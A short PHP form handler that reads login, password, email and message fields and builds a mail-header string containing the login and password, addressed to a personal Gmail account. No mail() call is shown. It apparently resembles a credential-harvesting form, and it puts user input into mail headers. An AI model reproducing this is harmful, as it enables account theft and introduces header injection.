<?php
if(!empty($_POST["send"])){
    $login = htmlentities($_POST["login"]);
    $password = htmlentities($_POST["password"]);
    $email = htmlentities($_POST["email"]);
    $message = htmlentities($_POST["message"]);
    $toEmail = "fixik2019@gmail.com";

    $mailHeaders = "Login: " . $login .
        "\r\n Password: " . $password .
        "\r\nMessage: " . $message . "\r\n";
}